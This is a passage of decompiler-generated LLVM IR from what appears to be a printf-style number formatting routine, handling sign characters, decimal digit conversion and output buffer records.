  %v3_805231e = zext i8 %v2_805231e to i32
  %v4_805231e = load i32, i32* %edx.global-to-local, align 4
  %v5_805231e = and i32 %v4_805231e, -256
  %v6_805231e = or i32 %v5_805231e, %v3_805231e
  store i32 %v6_805231e, i32* %edx.global-to-local, align 4
  %v7_8052320 = icmp eq i8 %v2_805231e, 48
  br i1 %v7_8052320, label %dec_label_pc_805231b.backedge, label %dec_label_pc_8052325

dec_label_pc_805231b.backedge:                    ; preds = %dec_label_pc_805231b, %dec_label_pc_8052325
  %v3_805231c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805231b

dec_label_pc_8052325:                             ; preds = %dec_label_pc_805231b
  %v2_8052325 = add i8 %v2_805231e, -57
  %v7_8052325 = sub i8 56, %v2_805231e
  %v8_8052325 = and i8 %v7_8052325, %v2_805231e
  %v9_8052325 = icmp slt i8 %v8_8052325, 0
  %v10_8052325 = icmp eq i8 %v2_8052325, 0
  %v11_8052325 = icmp slt i8 %v2_8052325, 0
  %v3_8052328 = icmp eq i1 %v11_8052325, %v9_8052325
  %v4_8052328 = icmp eq i1 %v10_8052325, false
  %v5_8052328 = and i1 %v4_8052328, %v3_8052328
  br i1 %v5_8052328, label %dec_label_pc_805231b.backedge, label %dec_label_pc_805232a

dec_label_pc_805232a:                             ; preds = %dec_label_pc_8052325
  %v2_805232a = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_805232a, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_805231e, %v2_805232a
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_8052335, label %dec_label_pc_8052342

dec_label_pc_8052335:                             ; preds = %dec_label_pc_805232a
  store i32 %v2_8052217, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805234b

dec_label_pc_8052342:                             ; preds = %dec_label_pc_805232a
  store i32 %v2_805232a, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_805232a, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805234b

dec_label_pc_805234b:                             ; preds = %dec_label_pc_8052335, %dec_label_pc_8052342
  %v0_805234b = phi i32 [ %v0_805231e, %dec_label_pc_8052335 ], [ %v2_805232a, %dec_label_pc_8052342 ]
  %v1_805234b = add i32 %v0_805234b, 1
  store i32 %v1_805234b, i32* %eax.global-to-local, align 4
  %v2_8052352 = inttoptr i32 %v1_805234b to i8*
  store i8 0, i8* %v2_8052352, align 1
  br i1 %v1_80522a6, label %dec_label_pc_8052378, label %dec_label_pc_805235d

dec_label_pc_805235d:                             ; preds = %dec_label_pc_805234b
  %v0_805235d = load i32, i32* %esi.global-to-local, align 4
  %v5_8052360 = icmp slt i32 %v0_805235d, -4
  br i1 %v5_8052360, label %dec_label_pc_8052385, label %dec_label_pc_8052362

dec_label_pc_8052362:                             ; preds = %dec_label_pc_805235d
  %v1_8052362 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8052364 = icmp slt i32 %v1_8052362, %v0_805235d
  br i1 %v7_8052364, label %dec_label_pc_8052385, label %dec_label_pc_805236d

dec_label_pc_805236d:                             ; preds = %dec_label_pc_8052362
  %v2_8052374 = sub i32 %v1_8052362, %v0_805235d
  store i32 %v2_8052374, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052389

dec_label_pc_8052378:                             ; preds = %dec_label_pc_805234b
  %v4_8052378 = zext i8 %stack_var_-206.1 to i32
  %v5_8052378 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8052378 = and i32 %v5_8052378, -256
  %v7_8052378 = or i32 %v6_8052378, %v4_8052378
  store i32 %v7_8052378, i32* %ecx.global-to-local, align 4
  %v10_8052380 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8052380, label %dec_label_pc_8052378.dec_label_pc_8052389_crit_edge, label %dec_label_pc_8052385

dec_label_pc_8052378.dec_label_pc_8052389_crit_edge: ; preds = %dec_label_pc_8052378
  %v0_8052389.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052389

dec_label_pc_8052385:                             ; preds = %dec_label_pc_805235d, %dec_label_pc_8052362, %dec_label_pc_8052378
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8052378 ], [ 103, %dec_label_pc_8052362 ], [ 103, %dec_label_pc_805235d ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052393

dec_label_pc_8052389:                             ; preds = %dec_label_pc_8052378.dec_label_pc_8052389_crit_edge, %dec_label_pc_805236d
  %v0_8052389 = phi i32 [ %v0_8052389.pre, %dec_label_pc_8052378.dec_label_pc_8052389_crit_edge ], [ %v0_805235d, %dec_label_pc_805236d ]
  store i32 %v0_8052389, i32* %ebx.global-to-local, align 4
  %v2_805238b = icmp slt i32 %v0_8052389, 0
  %v1_805238d = icmp eq i1 %v2_805238b, false
  br i1 %v1_805238d, label %dec_label_pc_8052393, label %dec_label_pc_805238f

dec_label_pc_805238f:                             ; preds = %dec_label_pc_8052389
  %v0_805238f = load i32, i32* %edx.global-to-local, align 4
  %v1_805238f = add i32 %v0_805238f, -1
  store i32 %v1_805238f, i32* %edx.global-to-local, align 4
  %v1_8052390 = inttoptr i32 %v1_805238f to i8*
  store i8 48, i8* %v1_8052390, align 1
  %v0_80523c8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052393

dec_label_pc_8052393:                             ; preds = %dec_label_pc_8052389, %dec_label_pc_8052385, %dec_label_pc_805238f
  %v1_8052423 = phi i32 [ %v0_8052389, %dec_label_pc_8052389 ], [ %v0_80523c8.pre, %dec_label_pc_805238f ], [ 0, %dec_label_pc_8052385 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8052389 ], [ 102, %dec_label_pc_805238f ], [ %stack_var_-197.0, %dec_label_pc_8052385 ]
  %v2_8052393 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8052393, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_80523ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80523ae = inttoptr i32 %v0_80523ae to i8*
  %v2_80523ae = load i8, i8* %v1_80523ae, align 1
  %v3_80523ae = zext i8 %v2_80523ae to i32
  %v5_80523ae = and i32 %v2_8052393, -256
  %v6_80523ae = or i32 %v3_80523ae, %v5_80523ae
  store i32 %v6_80523ae, i32* %eax.global-to-local, align 4
  %v1_80523b0 = add i32 %v0_80523ae, 1
  store i32 %v1_80523b0, i32* %edi.global-to-local, align 4
  store i32 %v6_80523ae, i32* %stack_var_-22, align 4
  %v2_80523be = sub i32 %v1_805234b, %v1_80523b0
  store i32 %v2_80523be, i32* %edx.global-to-local, align 4
  %v1_80523c8 = icmp eq i32 %v1_8052423, 0
  %v2_80523c8 = icmp slt i32 %v1_8052423, 0
  br i1 %v2_80523c8, label %dec_label_pc_8052417, label %dec_label_pc_80523cc

dec_label_pc_80523cc:                             ; preds = %dec_label_pc_8052393
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80523d8 = sub i32 %v1_8052423, %v2_80523be
  %v8_80523d8 = xor i32 %v2_80523be, %v1_8052423
  %v9_80523d8 = xor i32 %v2_80523d8, %v1_8052423
  %v10_80523d8 = and i32 %v9_80523d8, %v8_80523d8
  %v11_80523d8 = icmp slt i32 %v10_80523d8, 0
  %v13_80523d8 = icmp slt i32 %v2_80523d8, 0
  %v2_80523da = icmp eq i1 %v13_80523d8, %v11_80523d8
  br i1 %v2_80523da, label %dec_label_pc_80523dc, label %dec_label_pc_8052410

dec_label_pc_80523dc:                             ; preds = %dec_label_pc_80523cc
  store i32 %v2_80523d8, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_80523d8, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_80523f1, label %dec_label_pc_805240c

dec_label_pc_80523f1:                             ; preds = %dec_label_pc_80523dc
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_805240c

dec_label_pc_805240c:                             ; preds = %dec_label_pc_80523dc, %dec_label_pc_80523f1
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_80523f1 ], [ %stack_var_-132, %dec_label_pc_80523dc ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805242c

dec_label_pc_8052410:                             ; preds = %dec_label_pc_80523cc
  %v4_8052412 = icmp eq i1 %v1_80523c8, false
  br i1 %v4_8052412, label %dec_label_pc_805241d, label %dec_label_pc_8052414

dec_label_pc_8052414:                             ; preds = %dec_label_pc_8052410
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052417

dec_label_pc_8052417:                             ; preds = %dec_label_pc_8052393, %dec_label_pc_8052414
  %v0_805245f73 = phi i32 [ %v1_8052423, %dec_label_pc_8052393 ], [ -1, %dec_label_pc_8052414 ]
  %v2_8052417 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052417, i32* @ecx, align 4
  br label %dec_label_pc_805242c

dec_label_pc_805241d:                             ; preds = %dec_label_pc_8052410
  %v2_8052421 = add i32 %v1_80523b0, %v1_8052423
  store i32 %v2_8052421, i32* %edi.global-to-local, align 4
  %v2_8052423 = sub i32 %v2_80523be, %v1_8052423
  store i32 %v2_8052423, i32* %edx.global-to-local, align 4
  %v2_8052425 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052425, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805242c

dec_label_pc_805242c:                             ; preds = %dec_label_pc_8052417, %dec_label_pc_805240c, %dec_label_pc_805241d
  %v0_805245f72 = phi i32 [ %v0_805245f73, %dec_label_pc_8052417 ], [ -1, %dec_label_pc_805240c ], [ -1, %dec_label_pc_805241d ]
  %v0_8052448 = phi i32 [ %v2_8052417, %dec_label_pc_8052417 ], [ %storemerge10, %dec_label_pc_805240c ], [ %v2_8052425, %dec_label_pc_805241d ]
  %v0_8052439 = phi i32 [ %v2_80523be, %dec_label_pc_8052417 ], [ 0, %dec_label_pc_805240c ], [ %v2_8052423, %dec_label_pc_805241d ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_8052433 = inttoptr i32 %v1_805208b to i8*
  %v3_8052433 = load i8, i8* %v2_8052433, align 1
  %v4_8052433 = and i8 %v3_8052433, 16
  %v5_8052433 = icmp eq i8 %v4_8052433, 0
  %v1_8052437 = icmp eq i1 %v5_8052433, false
  br i1 %v1_8052437, label %dec_label_pc_8052448, label %dec_label_pc_8052439

dec_label_pc_8052439:                             ; preds = %dec_label_pc_805242c
  %v1_8052439 = icmp eq i32 %v0_8052439, 0
  %v1_805243b = icmp eq i1 %v1_8052439, false
  br i1 %v1_805243b, label %dec_label_pc_8052448, label %dec_label_pc_805243d

dec_label_pc_805243d:                             ; preds = %dec_label_pc_8052439
  br i1 %v12_80522a1, label %dec_label_pc_805245f, label %dec_label_pc_8052444

dec_label_pc_8052444:                             ; preds = %dec_label_pc_805243d
  %v0_8052444 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8052444, 1
  br i1 %tmp140, label %dec_label_pc_805245f, label %dec_label_pc_8052448

dec_label_pc_8052448:                             ; preds = %dec_label_pc_8052444, %dec_label_pc_8052439, %dec_label_pc_805242c
  %v1_8052448 = inttoptr i32 %v0_8052448 to i32*
  store i32 112, i32* %v1_8052448, align 4
  %v0_805244e = load i32, i32* @ecx, align 4
  %v1_805244e = add i32 %v0_805244e, 4
  %v2_805244e = inttoptr i32 %v1_805244e to i32*
  store i32 1, i32* %v2_805244e, align 4
  %v0_8052455 = load i32, i32* @ecx, align 4
  %v1_8052455 = add i32 %v0_8052455, 8
  %v2_8052455 = inttoptr i32 %v1_8052455 to i32*
  store i32 ptrtoint (i32* @global_var_8057fe0.277 to i32), i32* %v2_8052455, align 4
  %v0_805245c = load i32, i32* @ecx, align 4
  %v1_805245c = add i32 %v0_805245c, 12
  store i32 %v1_805245c, i32* @ecx, align 4
  %v0_805245f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805245f

dec_label_pc_805245f:                             ; preds = %dec_label_pc_8052444, %dec_label_pc_805243d, %dec_label_pc_8052448
  %v0_8052464 = phi i32 [ %v0_8052448, %dec_label_pc_8052444 ], [ %v0_8052448, %dec_label_pc_805243d ], [ %v1_805245c, %dec_label_pc_8052448 ]
  %v0_805245f = phi i32 [ %v0_805245f72, %dec_label_pc_8052444 ], [ %v0_805245f72, %dec_label_pc_805243d ], [ %v0_805245f.pre, %dec_label_pc_8052448 ]
  %v1_805245f = add i32 %v0_805245f, 1
  %v8_805245f = icmp eq i32 %v1_805245f, 0
  store i32 %v1_805245f, i32* %ebx.global-to-local, align 4
  br i1 %v8_805245f, label %dec_label_pc_8052479, label %dec_label_pc_8052462

dec_label_pc_8052462:                             ; preds = %dec_label_pc_805245f
  store i32 %v1_805245f, i32* %eax.global-to-local, align 4
  %v1_8052464 = inttoptr i32 %v0_8052464 to i32*
  store i32 176, i32* %v1_8052464, align 4
  %v0_805246a = load i32, i32* %eax.global-to-local, align 4
  %v1_805246a = sub i32 0, %v0_805246a
  store i32 %v1_805246a, i32* %eax.global-to-local, align 4
  %v1_805246c = load i32, i32* @ecx, align 4
  %v2_805246c = add i32 %v1_805246c, 4
  %v3_805246c = inttoptr i32 %v2_805246c to i32*
  store i32 %v1_805246a, i32* %v3_805246c, align 4
  %v0_805246f = load i32, i32* @ecx, align 4
  %v1_805246f = add i32 %v0_805246f, 8
  %v2_805246f = inttoptr i32 %v1_805246f to i32*
  store i32 ptrtoint (i32* @global_var_8057fd3.276 to i32), i32* %v2_805246f, align 4
  %v0_8052476 = load i32, i32* @ecx, align 4
  %v1_8052476 = add i32 %v0_8052476, 12
  store i32 %v1_8052476, i32* @ecx, align 4
  br label %dec_label_pc_8052479

dec_label_pc_8052479:                             ; preds = %dec_label_pc_805245f, %dec_label_pc_8052462
  %v0_805247d = phi i32 [ %v0_8052464, %dec_label_pc_805245f ], [ %v1_8052476, %dec_label_pc_8052462 ]
  %v0_8052479 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052479 = icmp eq i32 %v0_8052479, 0
  br i1 %v1_8052479, label %dec_label_pc_805248c, label %dec_label_pc_805247d

dec_label_pc_805247d:                             ; preds = %dec_label_pc_8052479
  %v1_805247d = inttoptr i32 %v0_805247d to i32*
  store i32 112, i32* %v1_805247d, align 4
  %v0_8052483 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052483 = load i32, i32* @ecx, align 4
  %v2_8052483 = add i32 %v1_8052483, 4
  %v3_8052483 = inttoptr i32 %v2_8052483 to i32*
  store i32 %v0_8052483, i32* %v3_8052483, align 4
  %v0_8052486 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052486 = load i32, i32* @ecx, align 4
  %v2_8052486 = add i32 %v1_8052486, 8
  %v3_8052486 = inttoptr i32 %v2_8052486 to i32*
  store i32 %v0_8052486, i32* %v3_8052486, align 4
  %v0_8052489 = load i32, i32* @ecx, align 4
  %v1_8052489 = add i32 %v0_8052489, 12
  store i32 %v1_8052489, i32* @ecx, align 4
  br label %dec_label_pc_805248c

dec_label_pc_805248c:                             ; preds = %dec_label_pc_8052479, %dec_label_pc_805247d
  %v0_80524aa = phi i32 [ %v0_805247d, %dec_label_pc_8052479 ], [ %v1_8052489, %dec_label_pc_805247d ]
  br i1 %v1_80522a6, label %dec_label_pc_80524a0, label %dec_label_pc_8052493

dec_label_pc_8052493:                             ; preds = %dec_label_pc_805248c
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_805249a = load i8, i8* %v2_8052433, align 1
  %v4_805249a = and i8 %v3_805249a, 16
  %v5_805249a = icmp eq i8 %v4_805249a, 0
  br i1 %v5_805249a, label %dec_label_pc_80524bd, label %dec_label_pc_80524a0

dec_label_pc_80524a0:                             ; preds = %dec_label_pc_8052493, %dec_label_pc_805248c
  %v0_80524a0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80524a2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80524a2 = sub i32 %v0_80524a0, %v1_80524a2
  store i32 %v2_80524a2, i32* %eax.global-to-local, align 4
  %v1_80524a4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80524a4 = sub i32 %v2_80524a2, %v1_80524a4
  %v8_80524a4 = xor i32 %v1_80524a4, %v2_80524a2
  %v9_80524a4 = xor i32 %v2_80524a4, %v2_80524a2
  %v10_80524a4 = and i32 %v9_80524a4, %v8_80524a4
  %v11_80524a4 = icmp slt i32 %v10_80524a4, 0
  %v13_80524a4 = icmp slt i32 %v2_80524a4, 0
  %v2_80524a6 = icmp eq i1 %v13_80524a4, %v11_80524a4
  br i1 %v2_80524a6, label %dec_label_pc_80524bd, label %dec_label_pc_80524a8

dec_label_pc_80524a8:                             ; preds = %dec_label_pc_80524a0
  %v2_80524a8 = sub i32 %v1_80524a4, %v2_80524a2
  store i32 %v2_80524a8, i32* %ebp.global-to-local, align 4
  %v1_80524aa = inttoptr i32 %v0_80524aa to i32*
  store i32 176, i32* %v1_80524aa, align 4
  %v0_80524b0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80524b0 = load i32, i32* @ecx, align 4
  %v2_80524b0 = add i32 %v1_80524b0, 4
  %v3_80524b0 = inttoptr i32 %v2_80524b0 to i32*
  store i32 %v0_80524b0, i32* %v3_80524b0, align 4
  %v0_80524b3 = load i32, i32* @ecx, align 4
  %v1_80524b3 = add i32 %v0_80524b3, 8
  %v2_80524b3 = inttoptr i32 %v1_80524b3 to i32*
  store i32 ptrtoint (i32* @global_var_8057fd3.276 to i32), i32* %v2_80524b3, align 4
  %v0_80524ba = load i32, i32* @ecx, align 4
  %v1_80524ba = add i32 %v0_80524ba, 12
  store i32 %v1_80524ba, i32* @ecx, align 4
  br label %dec_label_pc_80524bd

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524a0, %dec_label_pc_8052493, %dec_label_pc_80524a8
  %v1_805254084 = phi i32 [ %v0_80524aa, %dec_label_pc_80524a0 ], [ %v0_80524aa, %dec_label_pc_8052493 ], [ %v1_80524ba, %dec_label_pc_80524a8 ]
  %v12_80524bd = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80524bd, label %dec_label_pc_8052533, label %dec_label_pc_80524c4

dec_label_pc_80524c4:                             ; preds = %dec_label_pc_80524bd
  %v0_80524cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80524cb = icmp slt i32 %v0_80524cb, 0
  %v1_80524cd = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_80524cb, i32* %edx.global-to-local, align 4
  br i1 %v2_80524cb, label %dec_label_pc_80524dc, label %dec_label_pc_80524d3

dec_label_pc_80524d3:                             ; preds = %dec_label_pc_80524c4
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80524e5

dec_label_pc_80524dc:                             ; preds = %dec_label_pc_80524c4
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_80524e3 = sub i32 0, %v0_80524cb
  store i32 %v1_80524e3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80524e5

dec_label_pc_80524e5:                             ; preds = %dec_label_pc_80524d3, %dec_label_pc_80524dc
  %v0_80524f977 = phi i32 [ %v0_80524cb, %dec_label_pc_80524d3 ], [ %v1_80524e3, %dec_label_pc_80524dc ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80524ed = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80524ed, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524f9

dec_label_pc_80524f9:                             ; preds = %dec_label_pc_80524f9.backedge, %dec_label_pc_80524e5
  %v0_8052507 = phi i32 [ %v0_805250a, %dec_label_pc_80524f9.backedge ], [ 2, %dec_label_pc_80524e5 ]
  %v0_8052503 = phi i32 [ %v0_8052503.pre, %dec_label_pc_80524f9.backedge ], [ %v2_80524ed, %dec_label_pc_80524e5 ]
  %v0_80524f9 = phi i32 [ %v9_8052501, %dec_label_pc_80524f9.backedge ], [ %v0_80524f977, %dec_label_pc_80524e5 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8052500 = ashr i32 %v0_80524f9, 31
  %v2_8052501 = zext i32 %v0_80524f9 to i64
  %v4_8052501 = zext i32 %v1_8052500 to i64
  %v5_8052501 = mul nuw i64 %v4_8052501, 4294967296
  %v6_8052501 = or i64 %v5_8052501, %v2_8052501
  %v8_8052501 = sdiv i64 %v6_8052501, 10
  %v9_8052501 = trunc i64 %v8_8052501 to i32
  store i32 %v9_8052501, i32* %eax.global-to-local, align 4
  %v11_8052501 = srem i64 %v6_8052501, 10
  %v12_8052501 = trunc i64 %v11_8052501 to i8
  %v1_8052503 = add i32 %v0_8052503, -1
  store i32 %v1_8052503, i32* %ebx.global-to-local, align 4
  %v1_8052504 = add i8 %v12_8052501, 48
  %v1_8052507 = add i32 %v0_8052507, 1
  store i32 %v1_8052507, i32* %esi.global-to-local, align 4
  %v3_8052508 = inttoptr i32 %v1_8052503 to i8*
  store i8 %v1_8052504, i8* %v3_8052508, align 1
  %v0_805250a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8052501, i32* %edx.global-to-local, align 4
  %v7_805250f = icmp sgt i32 %v0_805250a, 3
  br i1 %v7_805250f, label %dec_label_pc_8052511, label %dec_label_pc_80524f9.backedge

dec_label_pc_8052511:                             ; preds = %dec_label_pc_80524f9
  %v2_8052511 = icmp eq i32 %v9_8052501, 0
  %v1_8052513 = icmp eq i1 %v2_8052511, false
  br i1 %v1_8052513, label %dec_label_pc_80524f9.backedge, label %dec_label_pc_8052515

dec_label_pc_80524f9.backedge:                    ; preds = %dec_label_pc_8052511, %dec_label_pc_80524f9
  %v0_8052503.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80524f9

dec_label_pc_8052515:                             ; preds = %dec_label_pc_8052511
  %v0_8052515 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8052515, i32* %edx.global-to-local, align 4
  %v0_8052517 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052517 = add i32 %v0_8052517, -2
  store i32 %v1_8052517, i32* %eax.global-to-local, align 4
  %v1_805251a = trunc i32 %v0_8052515 to i8
  %v3_805251a = add i32 %v0_8052517, -1
  %v4_805251a = inttoptr i32 %v3_805251a to i8*
  store i8 %v1_805251a, i8* %v4_805251a, align 1
  %v5_805251d = load i32, i32* %edx.global-to-local, align 4
  %v6_805251d = and i32 %v5_805251d, -256
  %v7_805251d = or i32 %v6_805251d, %stack_var_-42.0
  store i32 %v7_805251d, i32* %edx.global-to-local, align 4
  %v2_8052521 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052521 = add i32 %v2_8052521, -2
  %v4_8052521 = inttoptr i32 %v3_8052521 to i8*
  store i8 %v1_80524cd, i8* %v4_8052521, align 1
  %v0_8052524 = load i32, i32* @ecx, align 4
  %v1_8052524 = inttoptr i32 %v0_8052524 to i32*
  store i32 112, i32* %v1_8052524, align 4
  %v0_805252a = load i32, i32* %esi.global-to-local, align 4
  %v1_805252a = load i32, i32* @ecx, align 4
  %v2_805252a = add i32 %v1_805252a, 4
  %v3_805252a = inttoptr i32 %v2_805252a to i32*
  store i32 %v0_805252a, i32* %v3_805252a, align 4
  %v0_805252d = load i32, i32* %eax.global-to-local, align 4
  %v1_805252d = load i32, i32* @ecx, align 4
  %v2_805252d = add i32 %v1_805252d, 8
  %v3_805252d = inttoptr i32 %v2_805252d to i32*
  store i32 %v0_805252d, i32* %v3_805252d, align 4
  %v0_8052530 = load i32, i32* @ecx, align 4
  %v1_8052530 = add i32 %v0_8052530, 12
  store i32 %v1_8052530, i32* @ecx, align 4
  br label %dec_label_pc_8052533

dec_label_pc_8052533:                             ; preds = %dec_label_pc_80524bd, %dec_label_pc_8052158, %dec_label_pc_8052515
  %v0_80525b4 = phi i32 [ %v1_805254084, %dec_label_pc_80524bd ], [ %v2_8052160, %dec_label_pc_8052158 ], [ %v1_8052530, %dec_label_pc_8052515 ]
  %v2_8052533 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8052533, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052537

dec_label_pc_8052537:                             ; preds = %dec_label_pc_8052537, %dec_label_pc_8052533
  %v0_8052537 = phi i32 [ %v2_8052533, %dec_label_pc_8052533 ], [ %v1_8052539, %dec_label_pc_8052537 ]
  %stack_var_-216.0 = phi i32 [ %v3_805204b, %dec_label_pc_8052533 ], [ %v5_805253c, %dec_label_pc_8052537 ]
  %v1_8052537 = inttoptr i32 %v0_8052537 to i32*
  %v2_8052537 = load i32, i32* %v1_8052537, align 4
  store i32 %v2_8052537, i32* %edx.global-to-local, align 4
  %v1_8052539 = add i32 %v0_8052537, 12
  store i32 %v1_8052539, i32* %eax.global-to-local, align 4
  %v5_805253c = sub i32 %stack_var_-216.0, %v2_8052537
  %v7_8052540 = icmp ult i32 %v1_8052539, %v0_80525b4
  br i1 %v7_8052540, label %dec_label_pc_8052537, label %dec_label_pc_8052544

dec_label_pc_8052544:                             ; preds = %dec_label_pc_8052537
  %v5_805254d = icmp eq i8 %stack_var_-26.0, 0
  %v1_805255d = icmp eq i1 %v5_805254d, false
  %v2_805255d = zext i1 %v1_805255d to i32
  %v2_8052560 = sub i32 %v5_805253c, %v2_805255d
  store i32 %v2_8052560, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8052560, i32* %eax.global-to-local, align 4
  store i32 %v0_80525b4, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8052560, 1
  br i1 %tmp141, label %dec_label_pc_80525b6, label %dec_label_pc_8052576

dec_label_pc_8052576:                             ; preds = %dec_label_pc_8052544
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_805257d = inttoptr i32 %v1_805208b to i8*
  %v3_805257d = load i8, i8* %v2_805257d, align 1
  %v4_805257d = and i8 %v3_805257d, 8
  %v5_805257d = icmp eq i8 %v4_805257d, 0
  br i1 %v5_805257d, label %dec_label_pc_8052598, label %dec_label_pc_8052583

dec_label_pc_8052583:                             ; preds = %dec_label_pc_8052576
  %v1_8052583 = add i32 %v0_80525b4, 12
  store i32 %v1_8052583, i32* %esi.global-to-local, align 4
  %v1_8052586 = inttoptr i32 %v0_80525b4 to i32*
  store i32 160, i32* %v1_8052586, align 4
  %v0_805258c = load i32, i32* %eax.global-to-local, align 4
  %v1_805258c = load i32, i32* @ecx, align 4
  %v2_805258c = add i32 %v1_805258c, 4
  %v3_805258c = inttoptr i32 %v2_805258c to i32*
  store i32 %v0_805258c, i32* %v3_805258c, align 4
  %v0_805258f = load i32, i32* @ecx, align 4
  %v1_805258f = add i32 %v0_805258f, 8
  %v2_805258f = inttoptr i32 %v1_805258f to i32*
  store i32 ptrtoint (i32* @global_var_8057fd3.276 to i32), i32* %v2_805258f, align 4
  br label %dec_label_pc_80525b6

dec_label_pc_8052598:                             ; preds = %dec_label_pc_8052576
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805259f = add i32 %tmp112, 16
  %v2_805259f = inttoptr i32 %v1_805259f to i32*
  %v3_805259f = load i32, i32* %v2_805259f, align 4
  %v9_805259f = icmp eq i32 %v3_805259f, 48
  %v1_80525a3 = icmp eq i1 %v9_805259f, false
  br i1 %v1_80525a3, label %dec_label_pc_80525b0, label %dec_label_pc_80525a5

dec_label_pc_80525a5:                             ; preds = %dec_label_pc_8052598
  %v3_80525a5 = load i32, i32* %stack_var_-152, align 4
  %v5_80525a5 = add i32 %v3_80525a5, %v2_8052560
  store i32 %v5_80525a5, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80525b4

dec_label_pc_80525ab:                             ; preds = %dec_label_pc_80525bc
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80525e3

dec_label_pc_80525b0:                             ; preds = %dec_label_pc_8052598
  br label %dec_label_pc_80525b4

dec_label_pc_80525b4:                             ; preds = %dec_label_pc_80525a5, %dec_label_pc_80525b0
  store i32 %v0_80525b4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80525b6

dec_label_pc_80525b6:                             ; preds = %dec_label_pc_8052544, %dec_label_pc_8052583, %dec_label_pc_80525b4
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80525b8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80525b8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525bc

dec_label_pc_80525bc:                             ; preds = %dec_label_pc_80525da, %dec_label_pc_80525b6
  call void @__pseudo_call(i32 %tmp112)
  %v0_80525d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80525d5 = add i32 %v1_80525d5, 4
  %v3_80525d5 = inttoptr i32 %v2_80525d5 to i32*
  %v4_80525d5 = load i32, i32* %v3_80525d5, align 4
  %v15_80525d5 = icmp eq i32 %v0_80525d5, %v4_80525d5
  %v1_80525d8 = icmp eq i1 %v15_80525d5, false
  br i1 %v1_80525d8, label %dec_label_pc_80525ab, label %dec_label_pc_80525da

dec_label_pc_80525da:                             ; preds = %dec_label_pc_80525bc
  %v1_80525da = add i32 %v1_80525d5, 12
  store i32 %v1_80525da, i32* %ebx.global-to-local, align 4
  %v0_80525dd = load i32, i32* %edi.global-to-local, align 4
